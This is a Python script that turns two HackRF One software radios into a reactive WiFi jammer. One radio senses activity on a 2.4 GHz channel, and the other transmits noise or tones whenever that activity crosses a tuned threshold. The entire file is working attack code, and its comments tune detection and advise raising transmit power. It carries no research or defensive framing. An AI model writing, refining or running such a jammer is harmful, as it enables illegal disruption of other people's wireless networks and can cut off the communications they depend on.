#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Reactive WiFi Jammer using two HackRF One devices
# One for periodic sensing (RX), one for jamming (TX)
# Reactive = only jam when WiFi activity is detected

import time
import yaml
from gnuradio import gr
from gnuradio import blocks
from gnuradio import analog
from gnuradio import filter
from gnuradio.filter import firdes
from gnuradio.fft import window
from statistics import mean
import osmosdr
import numpy as np
import threading
import sys

# ==================== GLOBAL STATE FOR CONTINUOUS JAMMING ====================
jamming_tb = None
is_jamming = False
jamming_thread = None

# ==================== TUNABLE THRESHOLDS ====================
NOISE_FLOOR          = 0.000125
THRESHOLD_ON         = 0.000170   # ← lowered a bit from 0.000180 - should catch your 0.000199 spike
THRESHOLD_OFF        = 0.000145   # hysteresis - stop only when clearly below
T_SENSING            = 0.15       # seconds

def sense(freq, delay):
    samp_rate = 20e6
    sdr_bandwidth = 20e6

    tb = gr.top_block()

    # Sensing device - second HackRF (index 1)
    src = osmosdr.source(args="hackrf=1")
    src.set_sample_rate(samp_rate)
    src.set_center_freq(freq, 0)
    src.set_freq_corr(0, 0)
    src.set_gain(0, 0)
    src.set_if_gain(16, 0)
    src.set_bb_gain(16, 0)
    src.set_antenna('', 0)
    src.set_bandwidth(sdr_bandwidth, 0)

    lpf = filter.fir_filter_ccf(
        1,
        firdes.low_pass(1, samp_rate, 75e3, 25e3, window.WIN_HAMMING, 6.76)
    )

    c2magsq = blocks.complex_to_mag_squared(1)
    sink = blocks.file_sink(gr.sizeof_float * 1, 'output.bin', False)
    sink.set_unbuffered(True)

    tb.connect(src, lpf, c2magsq, sink)

    tb.start()
    time.sleep(delay)
    tb.stop()
    tb.wait()
    tb = None  # help GC


def detect():
    try:
        samples = np.memmap("output.bin", mode="r", dtype=np.float32)
        if len(samples) == 0:
            return 0.0
        raw_mean = mean(samples)
        power = 0.5 * raw_mean
        print(f"  Raw mean mag²: {raw_mean:.8f}  →  Power estimate: {power:.8f}")
        return power
    except Exception as e:
        print(f"Detect error: {e}")
        return 0.0


def jam(freq, waveform, power, delay=0):
    print(f"\nJAMMING ACTIVE @ {freq/1e6:.1f} MHz  (power: {power} dBm)")
    
    samp_rate = 20e6
    sdr_bandwidth = 20e6
    RF_gain, IF_gain = set_gains(power)

    tb = gr.top_block()

    if waveform == 1:
        source = analog.sig_source_c(samp_rate, analog.GR_SIN_WAVE, 1000, 1, 0, 0)
    elif waveform == 2:
        source = analog.sig_source_f(samp_rate, analog.GR_SIN_WAVE, 1000, 1, 0, 0)
    elif waveform == 3:
        source = analog.noise_source_c(analog.GR_GAUSSIAN, 1.0, 1)
    else:
        print("Invalid waveform!")
        return None

    # Jamming device - first HackRF (index 0)
    sink = osmosdr.sink(args="hackrf=0")
    sink.set_sample_rate(samp_rate)
    sink.set_center_freq(freq, 0)
    sink.set_freq_corr(0, 0)
    sink.set_gain(RF_gain, 0)
    sink.set_if_gain(IF_gain, 0)
    sink.set_bb_gain(20, 0)
    sink.set_antenna('', 0)
    sink.set_bandwidth(sdr_bandwidth, 0)

    if waveform == 2:
        freq_mod = analog.frequency_modulator_fc(1)
        tb.connect(source, freq_mod, sink)
    else:
        tb.connect(source, sink)

    tb.start()

    if delay > 0:
        time.sleep(delay)
        tb.stop()
        tb.wait()
    else:
        return tb  # continuous mode


def set_gains(power):
    if -40 <= power <= 5:
        RF_gain = 0
        if power < -5:
            IF_gain = power + 40
        elif -5 <= power <= 2:
            IF_gain = power + 41
        else:
            IF_gain = power + 42
    elif 5 < power <= 14:
        RF_gain = 14
        IF_gain = power + 45
    else:
        print(f"Invalid power level: {power}")
        sys.exit(1)
    return RF_gain, IF_gain


def background_jam(freq, waveform, power):
    global jamming_tb, is_jamming
    jamming_tb = jam(freq, waveform, power, delay=0)
    if jamming_tb is not None:
        is_jamming = True
        jamming_tb.wait()  # blocks until externally stopped


if __name__ == "__main__":
    try:
        with open("config_v1.yaml") as f:
            config = yaml.safe_load(f)
    except Exception as e:
        print("Error loading config:", e)
        sys.exit(1)

    jammer_type = config.get("jammer", 1)
    jamming_mode = config.get("jamming", 2)
    waveform    = config.get("waveform", 3)
    power       = config.get("power", 6)   # your log shows 6 dBm - increase to 10 if needed!
    freq_mhz    = config.get("freq", 2462)
    duration    = config.get("duration", 600)

    freq = freq_mhz * 1e6

    print(f"Starting reactive jammer...")
    print(f"  Target freq:     {freq_mhz} MHz")
    print(f"  Waveform:        {waveform} (3=gaussian noise)")
    print(f"  Power:           {power} dBm")
    print(f"  Threshold ON:    {THRESHOLD_ON:.6f}")
    print(f"  Threshold OFF:   {THRESHOLD_OFF:.6f}")
    print(f"  Sensing time:    {T_SENSING} s\n")

    start_time = time.time()

    while True:
        elapsed = time.time() - start_time
        if elapsed >= duration:
            print("Total duration reached. Stopping.")
            break

        print(f"Sensing @ {freq/1e6:.1f} MHz  ({int(elapsed)}s elapsed)")
        sense(freq, T_SENSING)
        rx_power = detect()

        if jamming_mode == 2:  # reactive
            if rx_power > THRESHOLD_ON:
                if not is_jamming:
                    print("!!! ACTIVITY DETECTED !!! → Starting continuous jamming")
                    if jamming_thread and jamming_thread.is_alive():
                        # Give previous thread a chance to finish
                        time.sleep(0.3)
                    jamming_thread = threading.Thread(
                        target=background_jam,
                        args=(freq, waveform, power),
                        daemon=True
                    )
                    jamming_thread.start()
            else:
                if is_jamming and rx_power < THRESHOLD_OFF:
                    print("No activity → Stopping jamming")
                    if jamming_tb is not None:
                        try:
                            jamming_tb.stop()
                            jamming_tb.wait()  # no timeout - waits until finished
                            jamming_tb = None
                        except Exception as e:
                            print(f"Error stopping flowgraph: {e}")
                    is_jamming = False

        time.sleep(0.05)  # small breathing room between cycles

    # Final cleanup
    if is_jamming and jamming_tb is not None:
        print("Final cleanup - stopping jamming...")
        try:
            jamming_tb.stop()
            jamming_tb.wait()
        except Exception as e:
            print(f"Cleanup error: {e}")
    print("Done.")